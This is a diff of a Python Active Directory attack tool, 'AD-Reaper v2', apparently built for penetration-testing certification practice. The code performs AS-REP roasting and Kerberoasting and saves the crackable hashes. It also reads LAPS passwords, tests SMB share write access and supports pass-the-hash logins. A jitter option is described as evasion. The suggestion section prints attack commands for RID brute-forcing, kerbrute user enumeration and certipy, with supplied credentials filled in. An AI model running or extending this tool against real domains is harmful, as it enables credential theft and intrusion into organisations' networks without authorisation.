+                print_vuln(f"AS-REP roastable: {user} → {hash_val}")
+                f.write(hash_val + '\n')
+                asrep_users.append(user)
 
-    if not roastable_users:
-        print_secure("No AS-REP roastable users found.")
-    
-    return roastable_users
+            except Exception as e:
+                err_str = str(e).lower()
 
-def parse_hashes(hash_string):
-    """Parses an LM:NT hash string."""
-    try:
-        lm_hash, nt_hash = hash_string.split(':')
-        if len(lm_hash) == 32 and len(nt_hash) == 32:
-            print_info("Using LM:NT hash format for authentication.")
-            return lm_hash, nt_hash
-    except ValueError:
-        pass # Fall through to the error
-    print_error("Invalid hash format. Expected LM:NT (e.g., 'aad3...:31d6...').")
-    sys.exit(1)
+                # Clean handling for the most common preauth-required case
+                if "preauth required" in err_str or "uf_dont_require_preauth" in err_str:
+                    print_error(f"AS-REP failed for {user}: User does NOT have UF_DONT_REQUIRE_PREAUTH set")
+                elif "kdc_err" in err_str or "kerberoserror" in err_str:
+                    print_error(f"AS-REP failed for {user}: KDC rejected request ({str(e).splitlines()[0]})")
+                else:
+                    # Fallback — show first line only, suppress the ASN.1 vomit
+                    first_line = str(e).splitlines()[0] if str(e) else "Unknown error"
+                    print_error(f"AS-REP failed for {user}: {first_line}")
+
+    if asrep_users:
+        print_success(f"AS-REP hashes saved to {hash_file} ({len(asrep_users)} users)")
+    else:
+        print_info("No AS-REP roastable accounts found in this list")
+
+    return asrep_users
 
 def get_domain_from_ldap(target_ip):
     """
@@ -570,30 +646,11 @@ def get_domain_from_ldap(target_ip):
         pass # Fail silently if anonymous bind is not allowed
     return None
 
-# --- Authenticated Functions ---
-
-def parse_identity(user_string):
-    """Parses a user string in 'domain/user' or 'user' format."""
-    if '/' in user_string:
-        return user_string.split('/', 1)
-    elif '\\' in user_string:
-        return user_string.split('\\', 1)
-    else:
-        return '', user_string
-
-def check_port(target_ip, port):
-    """Simple socket check to see if a service is listening."""
-    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-        s.settimeout(2)
-        try:
-            s.connect((target_ip, port))
-            return True
-        except (socket.timeout, ConnectionRefusedError):
-            return False
+# ---- Authenticated Functions ----
 
 def enumerate_smb_shares_auth(target_ip, domain, username, password, lmhash, nthash):
     """Connects to SMB with credentials and lists accessible shares."""
-    print_section_header("Authenticated SMB Share Enumeration")
+    print_section("Authenticated SMB Share Enumeration")
     try:
         conn = SMBConnection(target_ip, target_ip, timeout=5)
         conn.login(username, password, domain, lmhash=lmhash, nthash=nthash)
@@ -631,7 +688,7 @@ def enumerate_smb_shares_auth(target_ip, domain, username, password, lmhash, nth
                 tid, fid = conn.createFile(share_name, temp_file)
                 conn.closeFile(tid, fid)
                 conn.deleteFile(share_name, temp_file)
-                access_summary.append(f"{Style.RED}WRITE{Style.RESET}") # Write is always a high finding
+                access_summary.append(f"{Style.RED}WRITE{Style.RESET}")
             except SessionError:
                 access_summary.append(f"{Style.RED}NO WRITE{Style.RESET}")
             
@@ -647,13 +704,13 @@ def enumerate_smb_shares_auth(target_ip, domain, username, password, lmhash, nth
         print_fail(f"Connection Error: {e}")
 
 def enumerate_ldap_auth(target_ip, domain, username, password, lmhash, nthash, dump_hashes=False, hash_format='hashcat', output_dir=None):
-    findings = {'spns': [], 'admin_users': []}
     """
     Performs a comprehensive, authenticated LDAP enumeration.
     Returns the domain's search_base, a list of the user's groups, and a
     dictionary of findings (SPNs, admin users).
     """
-    print_section_header("Authenticated LDAP Enumeration")
+    findings = {'spns': [], 'admin_users': []}
+    print_section("Authenticated LDAP Enumeration")
     user_dn = f"{domain}\\{username}" if domain else username
     user_groups = []
     search_base = None
@@ -759,7 +816,7 @@ def enumerate_ldap_auth(target_ip, domain, username, password, lmhash, nthash, d
         print_fail(f"LDAP Error: {e}")
 
     if dump_hashes and spn_users:
-        print_section_header("Kerberoasting Hashes")
+        print_section("Kerberoasting Hashes")
         roaster = GetUserSPNs(username, password, domain, '', lmhash, nthash, target_ip, hash_format)
         roaster.request_multiple_TGSs(spn_users, output_dir)
 
@@ -771,20 +828,19 @@ def find_ad_misconfigs_auth(target_ip, domain, username, password, lmhash, nthas
     Returns a dictionary of findings (unconstrained delegation, LAPS).
     """
     if not search_base:
-        print_info("Skipping misconfiguration check (no search_base from LDAP).")
-        return
+        print_info("Skipping misconfig check (no search_base)")
+        return {}
 
     findings = {'unconstrained_delegation': [], 'laps_readable': []}
-    print_section_header("AD Misconfiguration Check")
+    print_section("AD Misconfiguration Check")
     user_dn = f"{domain}\\{username}" if domain else username
     try:
         server = Server(target_ip, get_info=ALL)
-        auth_password = f"{lmhash}:{nthash}" if lmhash and nthash else password
-        conn = Connection(server, user=user_dn, password=auth_password, authentication=NTLM, auto_bind=True)
+        conn = Connection(server, user=user_dn, password=password if password else None, authentication=NTLM, auto_bind=True)
 
         print_info("Checking for accounts with Unconstrained Delegation...")
         delegation_filter = '(|(userAccountControl:1.2.840.113556.1.4.803:=524288)(samAccountType=805306369))'
-        conn.search(search_base, delegation_filter, attributes=['sAMAccountName', 'objectClass'])
+        conn.search(search_base, delegation_filter, attributes=['sAMAccountName', 'objectClass'], paged_size=500)  # Paged
         if not conn.entries:
             print_secure("  -> No accounts with Unconstrained Delegation found.")
         else:
@@ -794,26 +850,31 @@ def find_ad_misconfigs_auth(target_ip, domain, username, password, lmhash, nthas
                 findings['unconstrained_delegation'].append(entry.sAMAccountName.value)
 
         print_info("Checking for readable LAPS passwords...")
-        conn.search(search_base, '(objectClass=computer)', attributes=['sAMAccountName', 'ms-Mcs-AdmPwd'])
+        laps_attrs = ['sAMAccountName', 'ms-Mcs-AdmPwd', 'msLAPS-Password']
+        conn.search(search_base, '(objectClass=computer)', attributes=laps_attrs, paged_size=500)
         found_laps = False
         for entry in conn.entries:
-            if 'ms-Mcs-AdmPwd' in entry and entry['ms-Mcs-AdmPwd'].value:
-                print_vulnerable(f"  -> VULNERABLE: Can read LAPS password for {entry.sAMAccountName.value}: {entry['ms-Mcs-AdmPwd'].value}")
+            laps_pw = entry.get('ms-Mcs-AdmPwd') or entry.get('msLAPS-Password')
+            if laps_pw and laps_pw.value:
+                print_vuln(f"  -> VULNERABLE: Can read LAPS password for {entry.sAMAccountName.value}: {laps_pw.value}")
                 found_laps = True
                 findings['laps_readable'].append(entry.sAMAccountName.value)
         if not found_laps:
             print_secure("  -> No readable LAPS passwords found.")
+        else:
+            print_info("Note: Checked both legacy 'ms-Mcs-AdmPwd' and modern 'msLAPS-Password'")
+
         conn.unbind()
     except Exception as e:
         if 'invalid attribute type' in str(e):
-            print_fail("  -> LAPS attribute 'ms-Mcs-AdmPwd' not found in schema.")
+            print_fail("  -> LAPS attributes not found in schema (legacy env?)")
         else:
-            print_error(f"Could not perform misconfiguration check. Error: {e}")
+            print_error(f"Misconfig check failed: {e}")
     return findings
 
 def check_access_paths_auth(target_ip, user_groups, username, password, lmhash, nthash, domain):
     """Checks for RDP, WinRM, and WMI access with credentials."""
-    print_section_header("Remote Access Check")
+    print_section("Remote Access Check")
 
     # Port checks
     for port, name in [(5985, "WinRM"), (3389, "RDP"), (135, "WMI/RPC"), (1433, "MSSQL")]:
@@ -849,27 +910,24 @@ def check_access_paths_auth(target_ip, user_groups, username, password, lmhash, 
 def print_suggestions(target_ip, findings, auth_creds=None):
     """Prints a list of suggested follow-up commands based on scan findings."""
     
-    print_section_header("Actionable Suggestions")
+    print_section("Actionable Suggestions")
     
     # Use a flag to check if any suggestions were printed
     suggestions_made = False
+    domain = findings.get('domain_name', 'lab.local')
 
-    # Check for ADCS SPNs first, as it's a high-impact finding
+    # Check for ADCS SPNs first
     adcs_spns_found = []
-    if findings.get('spns'):
-        # Handle both anonymous (list of strings) and authenticated (list of dicts) findings
-        spn_list = [item['spn'] if isinstance(item, dict) else item for item in findings['spns']]
-        for spn in spn_list:
-            if spn.lower().startswith('adcs/'):
-                adcs_spns_found.append(spn)
+    if 'spns' in findings:
+        spn_list = [s if isinstance(s, str) else s.get('spn', '') for s in findings['spns']]
+        adcs_spns_found = [s for s in spn_list if s.lower().startswith(('adcs/', 'http/', 'certsrv/'))]
 
     if adcs_spns_found:
         print(f"{Style.YELLOW}[!] Active Directory Certificate Services (ADCS) SPN Found:{Style.RESET}")
-        domain = findings.get('domain_name', '<DOMAIN.LOCAL>')
-        ca_name = adcs_spns_found[0].split('/')[1].split('.')[0]
+        ca_name = adcs_spns_found[0].split('/')[1].split('.')[0] if '/' in adcs_spns_found[0] else 'DEFAULT-CA'
         print("  An SPN for ADCS was found. This indicates the presence of a Certificate Authority.")
         print("  You should enumerate it for misconfigurations (e.g., ESC1, ESC8) using Certipy.")
-        print(f"  > {Style.CYAN}certipy find -u '<user>@<domain>' -p '<password>' -dc-ip {target_ip} -ca '{ca_name}'{Style.RESET}\n")
+        print(f"  > {Style.CYAN}certipy find -u '{auth_creds.get('username', '<user>')}@{domain}' -p '{auth_creds.get('password', '<pass>')}' -dc-ip {target_ip} -ca '{ca_name}'{Style.RESET}\n")
         suggestions_made = True
 
     if findings.get('unconstrained_delegation'):
@@ -893,10 +951,13 @@ def print_suggestions(target_ip, findings, auth_creds=None):
 
     if findings.get('no_users_found'):
         print(f"{Style.YELLOW}[!] No Users Found via Anonymous Enumeration:{Style.RESET}")
-        # domain_name = findings.get('domain_name', 'TARGET-DC').split('.')[0].upper() 
         print("  Standard enumeration failed to find users. You can try to discover them")
         print("  by brute-forcing Relative IDs (RIDs).")
-        print(f"  > {Style.CYAN}nxc smb {target_ip} -u guest -p '' --rid-brute | grep SidTypeUser | cut -d'\' -f2 | cut -d' ' -f1 | tee users {Style.RESET}\n")
+        print(f"  > {Style.CYAN}nxc smb {target_ip} -u guest -p '' --rid-brute | grep SidTypeUser | cut -d'\\' -f2 | cut -d' ' -f1 | tee users.txt {Style.RESET}\n")
+        print("  Manualy prune 'users.txt and attempt Kerbaroast:")
+        print(f"  > {Style.CYAN}for user in $(cat users.txt); do GetNPUsers.py -no-pass -dc-ip {target_ip} {domain}/$user | grep krb5asrep; done {Style.RESET}\n")
+        print("  If netexec fails to find anything, kerbrute it:")
+        print(f"  > {Style.CYAN} kerbrute userenum -d {domain} /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc {target_ip}{Style.RESET}\n")
         suggestions_made = True
 
     if findings.get('sensitive_files_found'):
@@ -911,119 +972,251 @@ def print_suggestions(target_ip, findings, auth_creds=None):
 
 # --- Main Execution Logic ---
 
-def run_anonymous_scan(target_ip):
+def run_anonymous_scan(target_ip, users_file=None, dump_hashes=False, hash_format='hashcat', output_dir='.', no_roast=False, jitter=0, spider_shares=False):
     """
-    Executes all anonymous enumeration modules and returns a dictionary of findings.
+    Orchestrates the anonymous scanning modules: SMB null session, LDAP anonymous,
+    SAMR enumeration, and AS-REP roasting check.
     """
     findings = {}
-    print_section_header("SMB Anonymous Enumeration")
-    findings['sensitive_files_found'] = check_smb_null_session(target_ip)
+    print_section("SMB Anonymous Enumeration")
+    findings['sensitive_files_found'] = check_smb_null_session(target_ip, spider_shares)
 
-    print_section_header("LDAP Anonymous Enumeration")
-    findings['domain_dn'], ldap_users, findings['spns'] = query_ldap_anonymous(target_ip)
-    if findings.get('domain_dn'):
-        findings['domain_name'] = findings['domain_dn'].replace("DC=", "").replace(",", ".")
+    print_section("LDAP Anonymous Enumeration")
+    domain_dn, ldap_users, spns = query_ldap_anonymous(target_ip)
+    findings['domain_dn'] = domain_dn
+    findings['spns'] = spns
+    if domain_dn:
+        findings['domain_name'] = dn_to_dns(domain_dn)
 
-    print_section_header("SAMR Anonymous Enumeration")
+    print_section("SAMR Anonymous Enumeration")
     samr_users = enumerate_users_samr(target_ip)
 
     master_user_set = set(ldap_users) | set(samr_users)
     if master_user_set:
-        with open("ad_users.txt", "w") as f:
-            for user in sorted(list(master_user_set)):
+        with open(Path(output_dir) / "ad_users.txt", "w") as f:
+            for user in sorted(master_user_set):
                 f.write(f"{user}\n")
         print_info("Full user list saved to ad_users.txt")
     else:
         findings['no_users_found'] = True
 
-    print_section_header("AS-REP Roasting Check")
-    findings['asrep_users'] = check_asrep_roastable_users(target_ip, findings.get('domain_dn'), list(master_user_set))
+    print_section("AS-REP Roasting Check")
+    user_list = list(master_user_set)
+    if users_file:
+        try:
+            with open(users_file, 'r') as f:
+                user_list = [line.strip() for line in f if line.strip()]
+            print_info(f"Targeting {len(user_list)} users from {users_file} for AS-REP")
+        except Exception as e:
+            print_error(f"Failed to load users_file: {e}")
+    findings['asrep_users'] = check_asrep_roastable_users(target_ip, domain_dn, user_list, hash_format, output_dir, no_roast, jitter)
+    if dump_hashes and spns:
+        print_section("Kerberoasting")
+        print_error("Kerberoasting requires auth creds - skipping in anonymous mode")
     return findings
 
-def run_authenticated_scan(target_ip, username, password, lmhash, nthash):
+def run_authenticated_scan(target_ip, username, password, lmhash, nthash, domain=None, dump_hashes=False, hash_format='hashcat', output_dir='.', rc4_only=False, no_roast=False, jitter=0):
     """
-    Executes all authenticated enumeration modules and returns a dictionary of findings.
+    Orchestrates the authenticated scanning modules: LDAP enumeration, SMB shares,
+    misconfiguration checks, and Kerberoasting.
     """
     findings = {}
-    domain, user = parse_identity(username)
+    p_domain, user = parse_identity(username)
 
-    if not domain:
-        domain = get_domain_from_ldap(target_ip)
-        if not domain:
-            print_error("Could not auto-discover domain. Authentication may fail.")
+    # Honor --domain flag first
+    if domain:
+        print_info(f"Using domain from --domain flag: {domain}")
+    elif p_domain:
+        domain = p_domain
+        print_info(f"Using domain parsed from username: {domain}")
+    else:
+        print_info("No domain in username or --domain → trying LDAP discovery...")
+        discovered = get_domain_from_ldap(target_ip, username, password, lmhash, nthash)
+        if discovered:
+            domain = discovered
+        else:
+            print_error("LDAP discovery failed even with creds. Please supply --domain <FQDN>")
+            sys.exit(1)
+
 
     search_base, user_groups, ldap_findings = enumerate_ldap_auth(target_ip, domain, user, password, lmhash, nthash)
     findings.update(ldap_findings)
-
-    if search_base: # Only run if LDAP auth was successful
-        misconfig_findings = find_ad_misconfigs_auth(target_ip, domain, user, password, lmhash, nthash, search_base)
+    if search_base:
+        misconfig_findings = find_ad_misconfigs_auth(target_ip, domain, username, password, lmhash, nthash, search_base)
         findings.update(misconfig_findings)
-        findings['domain_name'] = search_base.replace("DC=", "").replace(",", ".")
+        findings['domain_name'] = dn_to_dns(search_base)
 
     enumerate_smb_shares_auth(target_ip, domain, user, password, lmhash, nthash)
 
     check_access_paths_auth(target_ip, user_groups, user, password, lmhash, nthash, domain)
+
+    if dump_hashes:
+        spn_list = findings.get('spns', [])
+        spn_users = []
+
+        for item in spn_list:
+            if isinstance(item, dict):
+                # Pull the actual sAMAccountName / user that owns the SPN
+                account = item.get('user') or item.get('sAMAccountName') or item.get('name')
+                if account and isinstance(account, str):
+                    spn_users.append(account)
+            elif isinstance(item, str):
+                # Legacy fallback — try to guess username from SPN string
+                print_info(f"Legacy SPN string: {item} — attempting parse")
+                parts = item.split('/')
+                if len(parts) > 1:
+                    guessed = parts[1].split('@')[0].split('.')[0]
+                    spn_users.append(guessed)
+
+        if spn_users:
+            spn_users = list(set(spn_users))
+            print_info(f"Preparing to Kerberoast {len(spn_users)} accounts: {', '.join(spn_users)}")
+            
+            print_section("Kerberoasting Hashes")
+            roaster = GetUserSPNs(user, password, domain, lmhash, nthash, target_ip, rc4_only, hash_format)
+            roaster.roast(spn_users, output_dir, jitter, no_roast)
+        else:
+            print_info("No valid usernames extracted from SPNs for roasting")
     return findings
+
+def get_domain_from_ldap(target_ip, username=None, password=None, lmhash=None, nthash=None):
+    """
+    Discover domain FQDN via LDAP RootDSE query.
+    Tries anonymous bind first; if that fails and creds are provided, uses authenticated bind.
+    Returns domain FQDN (e.g., 'forest.htb') or None on failure.
+    """
+    print_info(f"Discovering domain from {target_ip} via LDAP RootDSE...")
+
+    server = Server(target_ip, get_info=ALL)
+    conn = None
+    try:
+        # First, try anonymous
+        conn = Connection(server, authentication=ANONYMOUS, auto_bind=True)
+        print_success("Anonymous bind worked for discovery")
+
+    except (LDAPInvalidCredentialsResult, LDAPSocketOpenError) as anon_err:
+        print_error(f"Anonymous bind failed: {anon_err} — trying authenticated if creds available...")
+        if username and (password or (lmhash and nthash)):
+            user_dn = f"{username}"  # Adjust if needed for DOMAIN\user
+            try:
+                conn = Connection(
+                    server,
+                    user=user_dn,
+                    password=password,
+                    authentication=NTLM,
+                    lm_hash=lmhash,
+                    nt_hash=nthash,
+                    auto_bind=True
+                )
+                print_success("Authenticated bind worked for discovery")
+            except Exception as auth_err:
+                print_error(f"Authenticated bind failed: {auth_err}")
+                return None
+        else:
+            print_error("No creds provided for authenticated discovery — cannot proceed")
+            return None
+
+    except Exception as e:
+        print_error(f"LDAP connection failed: {e}")
+        return None
+
+    try:
+        conn.search('', '(objectClass=*)', BASE, attributes=['defaultNamingContext'])
+        if conn.entries and 'defaultNamingContext' in conn.entries[0]:
+            dn = conn.entries[0].defaultNamingContext.value
+            fqdn = dn_to_dns(dn)
+            if fqdn:
+                print_success(f"Discovered domain FQDN: {fqdn}")
+                return fqdn
+            else:
+                print_error("Could not convert DN to FQDN")
+        else:
+            print_error("No RootDSE info found")
+    except Exception as e:
+        print_error(f"RootDSE query failed: {e}")
+    finally:
+        if conn:
+            conn.unbind()
+
+    return None
+
+# ---- Main ----
 
 def main():
     parser = argparse.ArgumentParser(
-        description="A comprehensive Active Directory enumeration tool.",
-        epilog=f"""
+        description="AD-Reaper v2 - upgraded for CPTS / OSCP",
+        formatter_class=argparse.RawTextHelpFormatter,
+        epilog="""
 Examples:
-  Run anonymous scan (null sessions, AS-REP roast, etc.):
-    {Style.CYAN}python %(prog)s 192.168.56.10{Style.RESET}
+  Anonymous scan:
+    python ad-reaper.py 10.10.10.10
 
-  Run authenticated scan with a password:
-    {Style.CYAN}python %(prog)s 192.168.56.10 -u 'DOMAIN/user' -p 'Password123'{Style.RESET}
+  Auth + targeted roasting:
+    python ad-reaper.py 10.10.10.10 -u corp.local/jdavis -p Winter2025 --users-file interesting_users.txt --rc4-only
 
-  Run authenticated scan using Pass-the-Hash:
-    {Style.CYAN}python %(prog)s 172.16.10.5 -u 'Admin' -H 'aad3...:31d6...'{Style.RESET}
-""",
-        formatter_class=argparse.RawDescriptionHelpFormatter
+  PTH + output dir:
+    python ad-reaper.py 10.10.10.10 -u Administrator -H aad3b...:31d6... --output-dir loot --dump-hashes
+        """
     )
-    
-    parser.add_argument("target", help="The target IP address of the Domain Controller.")
 
-    auth_group = parser.add_argument_group('Authenticated Scan Options')
-    auth_group.add_argument("-u", "--username", help="Username for authentication (e.g., 'DOMAIN/user').")
-    auth_group.add_argument("-p", "--password", help="Password for authentication.")
-    auth_group.add_argument("-H", "--hashes", help="LM:NT hash for Pass-the-Hash authentication.")
+    parser.add_argument("target", help="DC IP")
 
-    hash_group = parser.add_argument_group('Hash Dumping Options')
-    hash_group.add_argument("--dump-hashes", action='store_true', help="Dump AS-REP and Kerberoast hashes (if found).")
-    hash_group.add_argument("--hash-format", choices=['john', 'hashcat'], default='hashcat', help="Format for dumped hashes.")
-    hash_group.add_argument("--output-dir", help="Directory to save hash files (default: current dir).")
+    g = parser.add_argument_group("Authentication")
+    g.add_argument("-u", "--username",   help="domain\\user or user@domain")
+    g.add_argument("-p", "--password",   help="password")
+    g.add_argument("-H", "--hashes",     help="LM:NT hash")
+    g.add_argument("-d", "--domain",     help="Force domain name (useful when discovery fails)")
+
+    g = parser.add_argument_group("Roasting & Output")
+    g.add_argument("--dump-hashes",      action="store_true", help="Dump AS-REP / Kerberoast hashes")
+    g.add_argument("--hash-format",      choices=['john','hashcat'], default='hashcat')
+    g.add_argument("--output-dir",       default=".", help="Where to save files")
+    g.add_argument("--users-file",       help="Target only these users for AS-REP roasting")
+    g.add_argument("--rc4-only",         action="store_true", help="Force RC4 for Kerberoasting")
+    g.add_argument("--no-roast",         action="store_true", help="Report roastable users without requesting tickets")
+    g.add_argument("--jitter",           type=float, default=0, help="Delay (seconds) jitter for roasting requests (evasion)")
+    g.add_argument("--spider-shares",    action="store_true", help="Recursively list files on accessible SMB shares (anonymous)")
+
+    g = parser.add_argument_group("Usability")
+    g.add_argument("--quiet",            action="store_true", help="Suppress console output, log to file")
 
     args = parser.parse_args()
 
     try:
         ipaddress.ip_address(args.target)
-    except ValueError:
-        print_error(f"Invalid target IP address: {args.target}")
+    except:
+        print_error(f"Invalid IP: {args.target}")
         sys.exit(1)
 
-    # Determine scan mode based on provided arguments
-    is_authenticated_scan = bool(args.username and (args.password or args.hashes))
+    outdir = Path(args.output_dir)
+    outdir.mkdir(parents=True, exist_ok=True)
 
-    if is_authenticated_scan:
-        if args.password and args.hashes:
-            parser.error("Please provide either a password (-p) or hashes (-H), not both.")
-        
-        password = args.password or ""
-        lmhash, nthash = ("", "")
+    if args.quiet:
+        sys.stdout = open(outdir / 'reaper.log', 'w')
+
+    is_auth = bool(args.username and (args.password or args.hashes))
+
+    if is_auth:
+        domain = args.domain or ''
+        pw   = args.password or ""
+        lmh, nth = ("","")
         if args.hashes:
-            lmhash, nthash = parse_hashes(args.hashes)
-        
-        print_section_header(f"Starting Authenticated Scan on {args.target}")
-        findings = run_authenticated_scan(args.target, args.username, password, lmhash, nthash)
-        auth_creds = {'username': args.username, 'password': password, 'lmhash': lmhash, 'nthash': nthash}
+            lmh, nth = parse_hashes(args.hashes)
+
+        print_section(f"Authenticated Scan → {args.target} @ {domain}\\{args.username.split('/')[-1]}")
+
+        findings = run_authenticated_scan(args.target, args.username, pw, lmh, nth, domain, args.dump_hashes, args.hash_format, args.output_dir, args.rc4_only, args.no_roast, args.jitter)
+        auth_creds = {'username': args.username, 'password': pw, 'lmhash': lmh, 'nthash': nth}
         print_suggestions(args.target, findings, auth_creds)
     else:
-        print_section_header(f"Starting Anonymous Scan on {args.target}")
-        findings = run_anonymous_scan(args.target)
+        print_section(f"Anonymous Scan → {args.target}")
+        findings = run_anonymous_scan(args.target, args.users_file, args.dump_hashes, args.hash_format, args.output_dir, args.no_roast, args.jitter, args.spider_shares)
         print_suggestions(args.target, findings)
 
-    print_section_header("Scan Complete")
+    print_section("Scan finished")
+    if args.quiet:
+        sys.stdout.close()
+        print("Output logged to reaper.log")
 
 if __name__ == "__main__":
     main()
